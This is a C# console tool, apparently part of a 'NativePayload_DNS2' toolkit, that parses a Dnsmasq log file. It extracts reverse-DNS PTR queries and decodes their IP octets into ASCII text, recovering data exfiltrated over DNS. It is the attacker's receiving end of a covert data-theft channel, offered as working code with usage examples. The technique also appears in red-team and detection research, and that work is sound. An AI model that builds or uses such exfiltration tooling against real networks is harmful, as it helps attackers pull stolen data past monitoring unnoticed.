using System;
using System.Collections.Generic;
using System.Text;

namespace LogReader
{
    class Program
    {
        static void Main(string[] args)
        {                   
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine();
            Console.WriteLine("NativePayload_DNS2 , Ver 2.0 \"Dnsmasq\" Log Reader");
            Console.WriteLine("Reading Dnsmasq Log for Dumping Exfiltrated DATA by DNS Traffic (PTR Records)");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Published by Damon Mohammadbagher Oct 2017");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("Syntax I : LogReader.exe \"Dnsmasq_log.txt\" Octet Mode 3 or 4 \"DNSServer_IPAddress\" ");
            Console.WriteLine("Example I: LogReader.exe \"Dnsmasq_log.txt\"  4 \"192.168.56.1\" ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("Syntax II: LogReader.exe \"Dnsmasq_log.txt\" Octet Mode 3 or 4 \"DNSServer_IPAddress\" DEBUG ");           
            Console.WriteLine("Example II: LogReader.exe \"Dnsmasq_log.txt\" 3 \"192.168.56.1\" DEBUG ");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
            string[] TextFile = System.IO.File.ReadAllLines(args[0]);
            string DNSServer = args[2];
            string[] DNSAddress = DNSServer.Split('.');
            string DNS_Address_Reverse_Sort;
            DNS_Address_Reverse_Sort = DNSAddress[3] + "." + DNSAddress[2] + "." + DNSAddress[1] + "." + DNSAddress[0];
            bool Is_4_Octets_Mode = false;
            if (args.Length > 2)
            {
                if (args[1] == "3") Is_4_Octets_Mode = false;
                if (args[1] == "4") Is_4_Octets_Mode = true;
            }
            List<byte> Records = new List<byte>();

            try
            {

                if (args.Length == 4)
                {
                    if (args[3].ToUpper() == "DEBUG")
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("[!] Debug Mode");
                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("|PTR Record| \t\t\t |DEBUG| \t |Exfiltrated Text/DATA|");
                        Console.WriteLine();
                    }
                }
               
                byte[] debug = new byte[4];
                foreach (string item in TextFile)
                {
                    if (item.Contains(".") && item.ToUpper().Contains("IN-ADDR.ARPA"))
                    {
                        if (!item.Contains(DNS_Address_Reverse_Sort))
                        {

                            if (Is_4_Octets_Mode)
                            {
                                string[] tmp = item.Split('.');

                                Records.Add(Convert.ToByte(tmp[3]));
                                Records.Add(Convert.ToByte(tmp[2]));
                                Records.Add(Convert.ToByte(tmp[1]));
                                Records.Add(Convert.ToByte(tmp[0]));
                              
                                debug[0] = Convert.ToByte(tmp[3]);
                                debug[1] = Convert.ToByte(tmp[2]);
                                debug[2] = Convert.ToByte(tmp[1]);
                                debug[3] = Convert.ToByte(tmp[0]);

                            }
                            if (!Is_4_Octets_Mode)
                            {
                                string[] tmp = item.Split('.');

                                Records.Add(Convert.ToByte(tmp[3]));
                                Records.Add(Convert.ToByte(tmp[2]));
                                Records.Add(Convert.ToByte(tmp[1]));

                                debug[0] = Convert.ToByte(tmp[3]);
                                debug[1] = Convert.ToByte(tmp[2]);
                                debug[2] = Convert.ToByte(tmp[1]);

                            }
                            

                            try
                            {
                                if (args.Length == 4)
                                {
                                    if (args[3].ToUpper() == "DEBUG")
                                    {
                                        Console.ForegroundColor = ConsoleColor.Gray;
                                        Console.Write(item);
                                        Console.ForegroundColor = ConsoleColor.DarkYellow;
                                        Console.Write("     === Debug ==>     ");
                                        Console.ForegroundColor = ConsoleColor.Green;
                                        Console.WriteLine(UTF8Encoding.ASCII.GetString(debug));
                                        Console.ForegroundColor = ConsoleColor.Gray;
                                    }
                                }
                            }
                            catch (Exception omg)
                            {
                                Console.WriteLine("error 1 : "+omg.Message);
                            }

                        }
                    }
                }

                byte[] Final_Exf_Text = new byte[Records.Count];

                for (int j = 0; j < Final_Exf_Text.Length; j++)
                {
                    string s = string.Format("{0:x2}", (Int32)Convert.ToInt32(Records[j].ToString()));
                    /// Debug
                    // Console.WriteLine(s);
                    Final_Exf_Text[j] = Convert.ToByte(s, 16);
                }

                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.Write("[!] Dumping this Text from Dnsmasq Log File \"{0}\" : ",args[0]);
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(UTF8Encoding.ASCII.GetChars(Final_Exf_Text));
                Console.ForegroundColor = ConsoleColor.Gray;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
